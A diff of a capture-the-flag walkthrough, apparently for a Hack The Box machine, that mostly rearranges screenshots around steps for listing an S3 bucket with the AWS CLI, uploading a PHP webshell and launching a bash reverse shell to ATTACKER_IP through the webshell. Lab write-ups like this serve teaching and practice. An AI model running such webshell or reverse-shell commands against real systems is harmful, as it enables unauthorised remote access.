@@ -41,26 +41,25 @@ We interact with the bucket using the AWS CLI.
 
 ```aws --endpoint=http://s3.thetoppers.htb s3 ls```
 
-
-<img width="570" height="114" alt="image" src="https://github.com/user-attachments/assets/ddf77ccd-6a16-4400-b8d5-e7b797886ab4" />
-
-
+<img width="420" height="83" alt="image" src="https://github.com/user-attachments/assets/111fbb37-5e43-40da-92bd-915c75d49ee5" />
 
 ```aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb```
 
+<img width="570" height="114" alt="image" src="https://github.com/user-attachments/assets/ddf77ccd-6a16-4400-b8d5-e7b797886ab4" />
 
-<img width="662" height="77" alt="image" src="https://github.com/user-attachments/assets/177dea07-f91a-4b42-a7bc-0eeab062ac32" />
 
 
 <h2>5) Exploitation : Upload Webshell</h2>
 
 We create a PHP shell and upload it to the bucket 
 
-<img width="691" height="151" alt="image" src="https://github.com/user-attachments/assets/46aa8f00-9117-4041-9a4b-83bd23d6e5e5" />
 
+<img width="662" height="77" alt="image" src="https://github.com/user-attachments/assets/177dea07-f91a-4b42-a7bc-0eeab062ac32" />
 The file is now accessible from the web server.
 We verify command execution.
-<img width="637" height="327" alt="image" src="https://github.com/user-attachments/assets/c527fb21-a98b-4e9b-af76-783c3dda2c73" />
+
+<img width="691" height="151" alt="image" src="https://github.com/user-attachments/assets/46aa8f00-9117-4041-9a4b-83bd23d6e5e5" />
+
 
 <h2>6) Reverse Shell</h2>
 Start a listener:
@@ -71,7 +70,7 @@ Execute a reverse shell from the webshell.
 
 ``` http://10.129.13.34/shell.php?cmd=bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' ```
 
-![Uploading image.png…]()
+<img width="637" height="327" alt="image" src="https://github.com/user-attachments/assets/c527fb21-a98b-4e9b-af76-783c3dda2c73" />
 
 
 
